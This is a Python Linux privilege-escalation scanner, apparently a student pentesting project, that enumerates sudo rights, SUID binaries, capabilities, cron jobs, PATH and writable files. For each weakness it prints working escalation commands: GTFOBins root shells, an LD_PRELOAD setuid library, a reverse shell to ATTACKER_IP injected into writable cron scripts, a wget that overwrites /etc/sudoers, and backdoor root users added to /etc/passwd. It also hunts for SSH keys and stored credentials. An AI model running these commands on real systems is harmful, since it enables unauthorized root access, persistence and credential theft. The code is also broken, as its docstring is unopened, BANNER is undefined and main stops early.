#!/usr/bin/env python3

Usage:
    python3 privesc_scanner.py
    python3 privesc_scanner.py --output /tmp/report.html

Requirements:
    No external dependencies — pure Python3 + standard Linux tools
"""

import subprocess
import os
import sys
import platform
import datetime
import socket
import json
import re
from pathlib import Path

# ─── COLORS ───────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def run(cmd, shell=True, timeout=8):
    """Run a shell command, return stdout string or empty."""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip()
    except Exception:
        return ""

def section(title):
    print(f"\n{BLUE}{BOLD}{'═'*55}{RESET}")
    print(f"{BLUE}{BOLD}  {title}{RESET}")
    print(f"{BLUE}{BOLD}{'═'*55}{RESET}")

def finding(level, msg):
    icons = {
        "CRITICAL": f"{RED}[!!!]",
        "HIGH":     f"{RED}[ ! ]",
        "MEDIUM":   f"{YELLOW}[ ~ ]",
        "INFO":     f"{CYAN}[ i ]",
        "OK":       f"{GREEN}[ ✓ ]"
    }
    icon = icons.get(level, "[?]")
    print(f"  {icon} {msg}{RESET}")
    return {"level": level, "message": msg}


# ─── REPORT ACCUMULATOR ───────────────────────────────────────────────────────
report = {
    "meta":        {},
    "system_info": {},
    "findings":    [],
    "techniques":  []
}

def add_finding(level, category, msg, technique=None, gtfobins=None, command=None):
    entry = {
        "level":     level,
        "category":  category,
        "message":   msg,
        "technique": technique,
        "gtfobins":  gtfobins,
        "command":   command
    }
    report["findings"].append(entry)
    finding(level, f"{BOLD}[{category}]{RESET} {msg}")
    if command:
        print(f"      {GREEN}↳ CMD: {command}{RESET}")
    if gtfobins:
        print(f"      {CYAN}↳ GTFOBins: {gtfobins}{RESET}")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 1 — SYSTEM INFORMATION
# ══════════════════════════════════════════════════════════════════════════════
def enum_system():
    section("1. SYSTEM INFORMATION")

    hostname = run("hostname")
    kernel   = run("uname -r")
    arch     = run("uname -m")
    os_info  = run("cat /etc/os-release | grep PRETTY_NAME").replace('PRETTY_NAME=', '').strip('"')
    whoami   = run("whoami")
    id_out   = run("id")
    home     = run("echo $HOME")
    shell    = run("echo $SHELL")

    report["system_info"] = {
        "hostname": hostname, "kernel": kernel, "arch": arch,
        "os": os_info, "user": whoami, "id": id_out,
        "home": home, "shell": shell,
        "date": datetime.datetime.now().isoformat()
    }

    print(f"  {GREEN}Hostname  :{RESET} {hostname}")
    print(f"  {GREEN}Kernel    :{RESET} {kernel}")
    print(f"  {GREEN}Arch      :{RESET} {arch}")
    print(f"  {GREEN}OS        :{RESET} {os_info}")
    print(f"  {GREEN}User      :{RESET} {whoami}  ({id_out})")
    print(f"  {GREEN}Shell     :{RESET} {shell}")

    # ── Kernel CVE hints ──────────────────────────────────────────────────────
    VULNERABLE_KERNELS = {
        "3.13": ("CVE-2015-1328 (overlayfs)", "https://www.exploit-db.com/exploits/37292"),
        "3.14": ("CVE-2014-4699 (ptrace)",    "https://www.exploit-db.com/exploits/34134"),
        "4.4":  ("CVE-2016-5195 DirtyCow",    "https://dirtycow.ninja"),
        "4.8":  ("CVE-2016-5195 DirtyCow",    "https://dirtycow.ninja"),
        "4.13": ("CVE-2017-1000253",           "https://www.exploit-db.com/exploits/43345"),
        "5.8":  ("CVE-2021-3156 Baron Samedit","https://github.com/blasty/CVE-2021-3156"),
        "5.10": ("CVE-2021-4034 PwnKit",       "https://github.com/ly4k/PwnKit"),
        "5.13": ("CVE-2021-4034 PwnKit",       "https://github.com/ly4k/PwnKit"),
    }

    kernel_major_minor = ".".join(kernel.split(".")[:2])
    matched = False
    for kv, (cve, url) in VULNERABLE_KERNELS.items():
        if kernel.startswith(kv):
            add_finding("CRITICAL", "KERNEL",
                f"Kernel {kernel} vulnerable: {cve}",
                technique="Kernel Exploit",
                command=f"# Download from: {url}\ngcc exploit.c -o exploit && ./exploit")
            matched = True
            break

    if not matched:
        finding("OK", f"No known kernel CVE match for {kernel} (manual check recommended)")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 2 — SUDO
# ══════════════════════════════════════════════════════════════════════════════
def enum_sudo():
    section("2. SUDO PERMISSIONS")

    sudo_l = run("sudo -l 2>/dev/null")
    if not sudo_l:
        finding("OK", "sudo -l returned nothing (no sudo rights or password required)")
        return

    print(f"\n{sudo_l}\n")

    # ── LD_PRELOAD ────────────────────────────────────────────────────────────
    if "LD_PRELOAD" in sudo_l and "env_keep" in sudo_l:
        add_finding("CRITICAL", "SUDO/LD_PRELOAD",
            "env_keep+=LD_PRELOAD enabled → LD_PRELOAD privilege escalation",
            technique="LD_PRELOAD Injection",
            command="""# shell.c:
# #include <stdio.h>
# #include <sys/types.h>
# #include <stdlib.h>
# void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_cmd>""")

    # ── NOPASSWD binaries ─────────────────────────────────────────────────────
    GTFOBINS = {
        "find":    "sudo find . -exec /bin/bash \\; -quit",
        "vim":     "sudo vim -c ':!/bin/bash'",
        "nano":    "sudo nano\n# Ctrl+R Ctrl+X → reset; sh 1>&0 2>&0",
        "less":    "sudo less /etc/passwd\n# type: !/bin/bash",
        "python":  "sudo python -c 'import os; os.system(\"/bin/bash\")'",
        "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
        "perl":    "sudo perl -e 'exec \"/bin/bash\";'",
        "ruby":    "sudo ruby -e 'exec \"/bin/bash\"'",
        "awk":     "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
        "nmap":    "sudo nmap --interactive\n# nmap> !sh",
        "more":    "sudo more /etc/hosts\n# type: !/bin/bash",
        "man":     "sudo man man\n# type: !/bin/bash",
        "env":     "sudo env /bin/bash",
        "cp":      "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p",
        "tar":     "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
        "zip":     "sudo zip /tmp/t.zip /tmp/t -T --unzip-command='sh -c /bin/bash'",
        "curl":    "sudo curl file:///etc/shadow",
        "wget":    "sudo wget -O /etc/sudoers http://attacker/sudoers",
        "base64":  "base64 /etc/shadow | base64 --decode",
        "cat":     "sudo cat /etc/shadow",
        "tee":     "echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
        "bash":    "sudo bash",
        "sh":      "sudo sh",
        "docker":  "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "git":     "sudo git -p help config\n# type: !/bin/bash",
        "ftp":     "sudo ftp\n# ftp> !/bin/bash",
        "mysql":   "sudo mysql -e '! /bin/bash'",
        "php":     "CMD='/bin/bash'\nsudo php -r \"system('$CMD');\"",
    }

    for binary, gtfocmd in GTFOBINS.items():
        pattern = rf"NOPASSWD.*{binary}\b"
        if re.search(pattern, sudo_l, re.IGNORECASE) or "NOPASSWD: ALL" in sudo_l:
            add_finding("CRITICAL", "SUDO/GTFOBins",
                f"NOPASSWD sudo on '{binary}' → GTFOBins shell escalation",
                technique="Sudo GTFOBins",
                gtfobins=f"https://gtfobins.github.io/gtfobins/{binary}/#sudo",
                command=gtfocmd)

    if "NOPASSWD: ALL" in sudo_l:
        add_finding("CRITICAL", "SUDO/ALL",
            "User can run ALL commands as root with NO password!",
            command="sudo /bin/bash")

    # ── Sudo version CVE check ────────────────────────────────────────────────
    sudo_version = run("sudo --version 2>/dev/null | head -1")
    print(f"  {CYAN}Sudo version: {sudo_version}{RESET}")
    if sudo_version:
        ver_match = re.search(r"(\d+\.\d+\.\d+)", sudo_version)
        if ver_match:
            ver = ver_match.group(1)
            parts = list(map(int, ver.split(".")))
            # CVE-2021-3156 Baron Samedit: sudo < 1.9.5p2
            if parts < [1, 9, 5]:
                add_finding("CRITICAL", "SUDO/CVE",
                    f"Sudo {ver} vulnerable to CVE-2021-3156 (Baron Samedit) — heap overflow",
                    technique="Kernel/Sudo CVE",
                    command="# https://github.com/blasty/CVE-2021-3156\ngit clone https://github.com/blasty/CVE-2021-3156\ncd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich")
            # CVE-2019-14287: sudo < 1.8.28
            if parts < [1, 8, 28]:
                add_finding("HIGH", "SUDO/CVE",
                    f"Sudo {ver} vulnerable to CVE-2019-14287 — run as user -1 bypass",
                    technique="Sudo CVE",
                    command="sudo -u#-1 /bin/bash")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 3 — SUID / SGID
# ══════════════════════════════════════════════════════════════════════════════
def enum_suid():
    section("3. SUID / SGID BINARIES")

    suid_list = run("find / -type f -perm -04000 -ls 2>/dev/null")
    if not suid_list:
        finding("OK", "No SUID files found (or no permission to search)")
        return

    SUID_GTFOBINS = {
        "base64":   "LFILE=/etc/shadow\nbase64 \"$LFILE\" | base64 --decode",
        "find":     "find . -exec /bin/bash -p \\; -quit",
        "vim":      "vim -c ':py3 import os; os.setuid(0); os.execv(\"/bin/sh\",[\"sh\",\"-c\",\"reset; exec sh\"])'",
        "python":   "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "python3":  "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "perl":     "perl -e 'use POSIX (setuid); setuid(0); exec(\"/bin/bash\");'",
        "bash":     "bash -p",
        "cp":       "cp /bin/bash /tmp/bash && /tmp/bash -p",
        "nmap":     "./nmap --interactive  →  !sh",
        "pkexec":   "# CVE-2021-4034 PwnKit\n# https://github.com/ly4k/PwnKit",
        "sudo":     "# Check sudo version for CVEs (CVE-2021-3156, CVE-2019-14287)",
        "env":      "./env /bin/bash -p",
        "php7.4":   "php7.4 -r \"pcntl_exec('/bin/bash', ['-p']);\"",
        "node":     "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",[],{stdio:\"inherit\"})'",
        "ruby":     "ruby -e 'Process::Sys.setuid(0); exec(\"/bin/bash\")'",
        "strace":   "sudo strace -o /dev/null /bin/bash",
    }

    found_suid = []
    all_suid = []

    for line in suid_list.splitlines():
        parts = line.split()
        if len(parts) >= 11:
            binary = parts[-1]
            all_suid.append(binary)
            bname = Path(binary).name

            for pattern, cmd in SUID_GTFOBINS.items():
                if bname == pattern or bname.startswith(pattern):
                    add_finding("HIGH", "SUID",
                        f"SUID binary: {binary}",
                        technique="SUID GTFOBins",
                        gtfobins=f"https://gtfobins.github.io/gtfobins/{bname}/#suid",
                        command=f"# Binary: {binary}\n{cmd}")
                    found_suid.append(binary)
                    break

    if not found_suid:
        finding("INFO", "SUID files found — none match GTFOBins. Review manually:")
        for b in all_suid[:20]:
            print(f"      {YELLOW}{b}{RESET}")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 4 — CAPABILITIES
# ══════════════════════════════════════════════════════════════════════════════
def enum_capabilities():
    section("4. LINUX CAPABILITIES")

    caps = run("getcap -r / 2>/dev/null")
    if not caps:
        finding("OK", "No interesting capabilities found")
        return

    CAP_EXPLOITS = {
        "cap_setuid": {
            "desc":    "Can change UID → escalate to root",
            "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "perl":    "perl -e 'use POSIX (setuid); setuid(0); exec(\"/bin/bash\");'",
            "node":    "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",[],{stdio:\"inherit\"})'",
            "vim":     "./vim -c ':py3 import os; os.setuid(0); os.execv(\"/bin/sh\",[\"sh\",\"-c\",\"reset; exec sh\"])'",
        },
        "cap_net_raw": {
            "desc": "Can send raw packets — sniffing/spoofing possible",
        },
        "cap_dac_read_search": {
            "desc":    "Bypass file read permission → read /etc/shadow",
            "python3": "python3 -c 'print(open(\"/etc/shadow\").read())'",
        },
        "cap_sys_admin": {
            "desc": "Equivalent to root — many exploits possible",
        },
        "cap_sys_ptrace": {
            "desc": "Can trace root processes → inject shellcode",
        },
        "cap_net_bind_service": {
            "desc": "Can bind to ports < 1024",
        },
        "cap_chown": {
            "desc":    "Can change file ownership → take ownership of /etc/shadow",
            "python3": "python3 -c 'import os; os.chown(\"/etc/shadow\", 1000, 1000)'\n# Then read /etc/shadow",
        },
        "cap_fowner": {
            "desc": "Can bypass file permission checks",
        },
    }

    for line in caps.splitlines():
        print(f"  {YELLOW}{line}{RESET}")
        parts = line.split()
        if not parts:
            continue
        binary = parts[0]
        bname  = Path(binary).name

        for cap, info in CAP_EXPLOITS.items():
            if cap in line:
                desc = info.get("desc", "")
                cmd  = info.get(bname, info.get("python3",
                       f"# Check GTFOBins for {bname} with {cap}"))
                add_finding("CRITICAL", "CAPABILITIES",
                    f"{binary} has {cap} → {desc}",
                    technique="Linux Capabilities",
                    gtfobins=f"https://gtfobins.github.io/gtfobins/{bname}/#capabilities",
                    command=f"# Binary: {binary}\n{cmd}")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 5 — CRON JOBS
# ══════════════════════════════════════════════════════════════════════════════
def enum_cron():
    section("5. CRON JOBS")

    crontab    = run("cat /etc/crontab 2>/dev/null")
    cron_d     = run("ls /etc/cron.d/ 2>/dev/null")
    crontab_u  = run("crontab -l 2>/dev/null")

    reverse_shell = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

    if crontab:
        print(f"\n{YELLOW}[/etc/crontab]{RESET}")
        print(f"{crontab}\n")
        report["system_info"]["crontab"] = crontab

    if crontab_u:
        print(f"\n{YELLOW}[current user crontab]{RESET}")
        print(f"{crontab_u}\n")

    # Check all cron directories
    cron_sources = ["/etc/crontab", "/etc/cron.d/", "/var/spool/cron/",
                    "/etc/cron.hourly/", "/etc/cron.daily/",
                    "/etc/cron.weekly/", "/etc/cron.monthly/"]

    all_cron_content = crontab
    for src in cron_sources[1:]:
        content = run(f"cat {src}* 2>/dev/null")
        if content:
            all_cron_content += "\n" + content

    for line in all_cron_content.splitlines():
        if line.startswith("#") or not line.strip():
            continue
        if "/" in line:
            parts = line.split()
            for p in parts:
                if p.startswith("/") and ("." in p or "/" in p):
                    exists   = os.path.exists(p)
                    writable = os.access(p, os.W_OK) if exists else False
                    if writable:
                        add_finding("CRITICAL", "CRON",
                            f"Writable cron script: {p}",
                            technique="Cron Job Hijacking",
                            command=f"echo '{reverse_shell}' >> {p}\n# Listener: nc -lvp 4444")
                    elif not exists:
                        parent = str(Path(p).parent)
                        if os.path.isdir(parent) and os.access(parent, os.W_OK):
                            add_finding("HIGH", "CRON",
                                f"Missing cron script — parent dir writable: {p}",
                                technique="Cron Script Creation",
                                command=f"echo '#!/bin/bash\n{reverse_shell}' > {p}\nchmod +x {p}")
                        else:
                            add_finding("INFO", "CRON",
                                f"Cron references missing script: {p}")
                    else:
                        finding("INFO", f"Cron script exists (not writable): {p}")

    if cron_d:
        add_finding("INFO", "CRON",
            f"Files in /etc/cron.d/: {cron_d}")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 6 — PATH HIJACKING
# ══════════════════════════════════════════════════════════════════════════════
def enum_path():
    section("6. PATH VARIABLE HIJACKING")

    path_val = run("echo $PATH")
    print(f"  {GREEN}PATH:{RESET} {path_val}")

    writable_in_path = []
    for d in path_val.split(":"):
        if d and os.path.isdir(d) and os.access(d, os.W_OK):
            writable_in_path.append(d)
            add_finding("HIGH", "PATH",
                f"Writable directory in PATH: {d}",
                technique="PATH Hijacking",
                command=f"""export PATH={d}:$PATH
echo '/bin/bash' > {d}/<target_command>
chmod +x {d}/<target_command>
# Run the vulnerable SUID binary""")

    suid_scripts = run(
        "find / -type f -perm -04000 \\( -name '*.sh' -o -name '*.py' \\) 2>/dev/null"
    )
    if suid_scripts:
        for f in suid_scripts.splitlines():
            add_finding("HIGH", "PATH/SUID-SCRIPT",
                f"SUID script — check for relative commands: {f}",
                technique="PATH Hijacking via SUID Script",
                command=f"cat {f}\nexport PATH=/tmp:$PATH\necho '/bin/bash' > /tmp/<cmd>\nchmod +x /tmp/<cmd>")

    if not writable_in_path and not suid_scripts:
        finding("OK", "No writable PATH directories or SUID scripts found")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 7 — WRITABLE FILES & INTERESTING FILES
# ══════════════════════════════════════════════════════════════════════════════
def enum_writable():
    section("7. SENSITIVE / WRITABLE FILES")

    # /etc/passwd writable?
    if os.access("/etc/passwd", os.W_OK):
        add_finding("CRITICAL", "WRITABLE",
            "/etc/passwd is writable → add backdoor root user",
            technique="Passwd File Manipulation",
            command="""python3 -c "import crypt; print(crypt.crypt('password123','\\$6\\$salt'))"
echo 'hacker:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker""")

    # /etc/shadow writable?
    if os.access("/etc/shadow", os.W_OK):
        add_finding("CRITICAL", "WRITABLE",
            "/etc/shadow is writable → change root password hash",
            technique="Shadow File Manipulation",
            command="""python3 -c "import crypt; print(crypt.crypt('newpass','\\$6\\$salt'))"
# Replace root hash in /etc/shadow
su root""")

    # /etc/sudoers writable?
    if os.access("/etc/sudoers", os.W_OK):
        add_finding("CRITICAL", "WRITABLE",
            "/etc/sudoers is writable → grant full sudo",
            technique="Sudoers Manipulation",
            command="echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\nsudo /bin/bash")

    # SSH keys
    ssh_keys = run(
        "find /home /root -name 'authorized_keys' -o -name 'id_rsa' "
        "-o -name 'id_ed25519' 2>/dev/null"
    )
    for f in ssh_keys.splitlines():
        if os.access(f, os.R_OK):
            add_finding("HIGH", "SSH-KEYS",
                f"Readable SSH key: {f}",
                technique="SSH Key Extraction",
                command=f"cat {f}\n# Use for: ssh -i key user@target")

    # .bash_history
    hist = run("grep -i 'pass\\|sudo\\|su ' ~/.bash_history 2>/dev/null | head -20")
    if hist:
        add_finding("MEDIUM", "BASH_HISTORY",
            "Potential credentials in bash history",
            command=f"# Found:\n{hist}")

    # World-writable scripts
    ww_scripts = run(
        "find /etc /opt /usr/local -perm -o+w -name '*.sh' -o -name '*.py' 2>/dev/null"
    )
    for f in ww_scripts.splitlines():
        add_finding("HIGH", "WRITABLE-SCRIPT",
            f"World-writable script: {f}",
            technique="Script Hijacking",
            command=f"echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> {f}")

    # Config files with potential passwords
    config_files = run(
        "grep -rli 'password\\|passwd\\|secret\\|credential' "
        "/var/www /opt /home 2>/dev/null | head -10"
    )
    for f in config_files.splitlines():
        if os.access(f, os.R_OK):
            add_finding("MEDIUM", "CONFIG-FILE",
                f"Config file may contain credentials: {f}",
                technique="Credential Harvesting",
                command=f"grep -i 'pass\\|secret\\|key' {f}")


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 8 — NETWORK INFO
# ══════════════════════════════════════════════════════════════════════════════
def enum_network():
    section("8. NETWORK INFORMATION")

    interfaces = run("ip a 2>/dev/null || ifconfig 2>/dev/null")
    routes     = run("ip route 2>/dev/null || route -n 2>/dev/null")
    listening  = run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    arp        = run("arp -a 2>/dev/null || ip neigh 2>/dev/null")

    report["system_info"]["network"] = {
        "interfaces": interfaces[:1000],
        "routes":     routes[:500],
        "listening":  listening[:1000]
    }

    print(f"\n{CYAN}── Interfaces ──{RESET}")
    print(interfaces[:600])
    print(f"\n{CYAN}── Listening ports ──{RESET}")
    print(listening[:600])
    print(f"\n{CYAN}── ARP cache ──{RESET}")
    print(arp[:300])

    # Interesting internal services
    INTERESTING_PORTS = {
        "3306": "MySQL",
        "5432": "PostgreSQL",
        "27017": "MongoDB",
        "6379":  "Redis",
        "8080":  "HTTP Alt",
        "8443":  "HTTPS Alt",
        "8888":  "Jupyter/HTTP",
        "9200":  "Elasticsearch",
        "2375":  "Docker API",
        "2376":  "Docker TLS",
        "11211": "Memcached",
    }

    for port, service in INTERESTING_PORTS.items():
        if port in listening:
            add_finding("MEDIUM", "NETWORK",
                f"Internal service on port {port} ({service})",
                technique="Port Forwarding / Service Exploitation",
                command=f"# Interact locally:\nnc 127.0.0.1 {port}\n# Or: mysql -h 127.0.0.1 -u root")

    # Docker socket
    if os.path.exists("/var/run/docker.sock"):
        writable = os.access("/var/run/docker.sock", os.W_OK)
        if writable:
            add_finding("CRITICAL", "DOCKER",
                "/var/run/docker.sock is writable → container escape to root",
                technique="Docker Socket Escape",
                command="docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        else:
            add_finding("INFO", "DOCKER",
                "/var/run/docker.sock exists (not writable by current user)")


# ══════════════════════════════════════════════════════════════════════════════
#  HTML REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
LEVEL_COLOR = {
    "CRITICAL": "#ff4444",
    "HIGH":     "#ff8800",
    "MEDIUM":   "#ffcc00",
    "INFO":     "#44aaff",
    "OK":       "#44ff88",
}

def generate_html_report(output_path):
    info     = report["system_info"]
    findings = report["findings"]
    now      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    counts = {l: sum(1 for f in findings if f["level"] == l)
              for l in ["CRITICAL", "HIGH", "MEDIUM", "INFO", "OK"]}

    finding_cards = ""
    for f in findings:
        color = LEVEL_COLOR.get(f["level"], "#888")
        cmd_block = ""
        if f.get("command"):
            cmd_esc = f["command"].replace("<", "&lt;").replace(">", "&gt;")
            cmd_block = f'<div class="code-block"><pre>{cmd_esc}</pre></div>'
        gtfo_link = ""
        if f.get("gtfobins"):
            gtfo_link = f'<a href="{f["gtfobins"]}" target="_blank" class="gtfo-link">📌 GTFOBins</a>'
        technique_tag = ""
        if f.get("technique"):
            technique_tag = f'<span class="tag">{f["technique"]}</span>'

        finding_cards += f"""
        <div class="card" style="border-left:4px solid {color}">
          <div class="card-header">
            <span class="badge" style="background:{color}">{f["level"]}</span>
            <span class="category">[{f["category"]}]</span>
            <span class="card-msg">{f["message"]}</span>
          </div>
          <div class="card-meta">{technique_tag} {gtfo_link}</div>
          {cmd_block}
        </div>"""

    sysinfo_rows = ""
    for k, v in [
        ("Hostname", info.get("hostname", "")),
        ("Kernel",   info.get("kernel",   "")),
        ("Arch",     info.get("arch",     "")),
        ("OS",       info.get("os",       "")),
        ("User",     info.get("user",     "")),
        ("ID",       info.get("id",       "")),
        ("Shell",    info.get("shell",    ""))
    ]:
        sysinfo_rows += f"<tr><td class='key'>{k}</td><td>{v}</td></tr>"

    html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PrivEsc Report – {info.get('hostname','')}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
  :root {{
    --bg:#0a0c10; --bg2:#10141c; --bg3:#161b26;
    --border:#1e2636; --text:#c9d1d9;
    --accent:#ff4444; --cyan:#00e5ff;
    --mono:'JetBrains Mono',monospace;
    --sans:'Syne',sans-serif;
  }}
  *{{box-sizing:border-box;margin:0;padding:0;}}
  body{{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:100vh;}}
  header{{
    background:linear-gradient(135deg,#0d1117 0%,#1a0a0a 50%,#0d1117 100%);
    border-bottom:1px solid #ff444422;padding:2.5rem 3rem 2rem;
  }}
  .header-grid{{display:flex;align-items:center;gap:2rem;}}
  .skull{{font-size:4rem;filter:drop-shadow(0 0 20px #ff444488);}}
  .header-text h1{{font-size:2rem;font-weight:800;color:#fff;}}
  .header-text h1 span{{color:var(--accent);}}
  .header-text p{{color:#888;font-size:.85rem;font-family:var(--mono);margin-top:.3rem;}}
  .warning-banner{{
    margin-top:1rem;background:#ff44441a;border:1px solid #ff444433;
    border-radius:6px;padding:.6rem 1rem;
    font-size:.8rem;color:#ff8888;font-family:var(--mono);
  }}
  .stats-bar{{
    display:grid;grid-template-columns:repeat(5,1fr);
    gap:1px;background:var(--border);border-bottom:1px solid var(--border);
  }}
  .stat{{background:var(--bg2);padding:1.2rem 1rem;text-align:center;}}
  .stat-num{{font-size:2rem;font-weight:800;font-family:var(--mono);}}
  .stat-label{{font-size:.7rem;letter-spacing:2px;text-transform:uppercase;color:#666;margin-top:.2rem;}}
  .container{{display:grid;grid-template-columns:280px 1fr;}}
  aside{{background:var(--bg2);border-right:1px solid var(--border);padding:1.5rem;}}
  aside h3{{font-size:.7rem;letter-spacing:3px;color:#555;text-transform:uppercase;margin-bottom:1rem;}}
  table.sysinfo{{width:100%;border-collapse:collapse;}}
  table.sysinfo td{{padding:.4rem .2rem;font-size:.78rem;border-bottom:1px solid var(--border);font-family:var(--mono);}}
  table.sysinfo td.key{{color:#888;width:40%;}}
  .scan-info{{margin-top:1.5rem;padding:1rem;background:var(--bg3);border-radius:6px;font-size:.75rem;font-family:var(--mono);color:#666;}}
  main{{padding:2rem;}}
  main h2{{font-size:.7rem;letter-spacing:3px;color:#555;text-transform:uppercase;margin-bottom:1.5rem;}}
  .filters{{display:flex;gap:.5rem;margin-bottom:1.5rem;flex-wrap:wrap;}}
  .filter-btn{{
    background:var(--bg3);border:1px solid var(--border);color:#888;
    padding:.4rem .9rem;border-radius:4px;cursor:pointer;font-size:.78rem;
    font-family:var(--mono);transition:all .15s;
  }}
  .filter-btn.active,.filter-btn:hover{{border-color:var(--accent);color:#fff;}}
  .card{{
    background:var(--bg2);border:1px solid var(--border);border-radius:8px;
    padding:1.2rem 1.5rem;margin-bottom:1rem;transition:transform .15s;
  }}
  .card:hover{{transform:translateX(4px);}}
  .card-header{{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;}}
  .badge{{font-size:.65rem;font-weight:700;font-family:var(--mono);padding:.2rem .6rem;border-radius:3px;color:#000;}}
  .category{{color:#888;font-size:.8rem;font-family:var(--mono);}}
  .card-msg{{color:var(--text);font-size:.9rem;flex:1;}}
  .card-meta{{margin-top:.6rem;display:flex;gap:.8rem;align-items:center;}}
  .tag{{font-size:.7rem;padding:.15rem .5rem;border-radius:3px;background:#ffffff11;color:#888;font-family:var(--mono);}}
  .gtfo-link{{font-size:.75rem;color:var(--cyan);text-decoration:none;font-family:var(--mono);}}
  .code-block{{margin-top:.8rem;background:#000;border:1px solid #1e2636;border-radius:5px;padding:1rem;overflow-x:auto;}}
  .code-block pre{{font-family:var(--mono);font-size:.78rem;color:#88cc88;white-space:pre-wrap;}}
  footer{{background:var(--bg2);border-top:1px solid var(--border);padding:1.5rem 3rem;font-size:.75rem;color:#555;font-family:var(--mono);display:flex;justify-content:space-between;}}
</style>
</head>
<body>
<header>
  <div class="header-grid">
    <div class="skull">💀</div>
    <div class="header-text">
      <h1>Priv<span>Esc</span> Scanner Report</h1>
      <p>Target: {info.get('hostname','')} | User: {info.get('user','')} | {now}</p>
    </div>
  </div>
  <div class="warning-banner">⚠ FOR AUTHORIZED PENTESTING AND CTF USE ONLY</div>
</header>

<div class="stats-bar">
  <div class="stat"><div class="stat-num" style="color:#ff4444">{counts['CRITICAL']}</div><div class="stat-label">Critical</div></div>
  <div class="stat"><div class="stat-num" style="color:#ff8800">{counts['HIGH']}</div><div class="stat-label">High</div></div>
  <div class="stat"><div class="stat-num" style="color:#ffcc00">{counts['MEDIUM']}</div><div class="stat-label">Medium</div></div>
  <div class="stat"><div class="stat-num" style="color:#44aaff">{counts['INFO']}</div><div class="stat-label">Info</div></div>
  <div class="stat"><div class="stat-num">{len(findings)}</div><div class="stat-label">Total</div></div>
</div>

<div class="container">
  <aside>
    <h3>System Info</h3>
    <table class="sysinfo">{sysinfo_rows}</table>
    <div class="scan-info">
      🕐 Scanned: {now}<br>
      🔍 Kernel · Sudo · SUID<br>
      &nbsp;&nbsp;&nbsp;&nbsp;Capabilities · Cron<br>
      &nbsp;&nbsp;&nbsp;&nbsp;PATH · Files · Network
    </div>
  </aside>
  <main>
    <h2>Privilege Escalation Findings</h2>
    <div class="filters">
      <button class="filter-btn active" onclick="filter('all')">All ({len(findings)})</button>
      <button class="filter-btn" onclick="filter('CRITICAL')">Critical ({counts['CRITICAL']})</button>
      <button class="filter-btn" onclick="filter('HIGH')">High ({counts['HIGH']})</button>
      <button class="filter-btn" onclick="filter('MEDIUM')">Medium ({counts['MEDIUM']})</button>
      <button class="filter-btn" onclick="filter('INFO')">Info ({counts['INFO']})</button>
    </div>
    <div id="findings">
      {''.join(finding_cards) if findings else '<div style="text-align:center;padding:4rem;color:#444">🎉 No findings — system appears hardened</div>'}
    </div>
  </main>
</div>

<footer>
  <span>privesc_scanner.py — Linux PrivEsc Enumeration | PFE 3D Smart Factory</span>
  <span>{info.get('kernel','')} | {info.get('arch','')}</span>
</footer>

<script>
function filter(level) {{
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  event.target.classList.add('active');
  document.querySelectorAll('.card').forEach(c => {{
    if (level === 'all') {{ c.style.display=''; return; }}
    c.style.display = c.querySelector('.badge')?.textContent === level ? '' : 'none';
  }});
}}
</script>
</body>
</html>"""

    with open(output_path, "w") as f:
        f.write(html)
    print(f"\n  {GREEN}[✓] HTML report: {output_path}{RESET}")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    import argparse
    parser = argparse.ArgumentParser(description="PrivEsc Scanner — Linux Privilege Escalation")
    parser.add_argument("--output", default="", help="Custom HTML output path")
    parser.add_argument("--json-only", action="store_true", help="JSON output only")
    args = parser.parse_args()

    print(BANNER)

    if os.name == "nt":
        print(f"{RED}[!] This tool is designed for Linux only.{RESET}")
        sys.exit(1)

    report["meta"]["start"] = datetime.datetime.now().isoformat()
    report["meta"]["user"]  = run("whoami")

    # ── Run all modules ──
    enum_system()
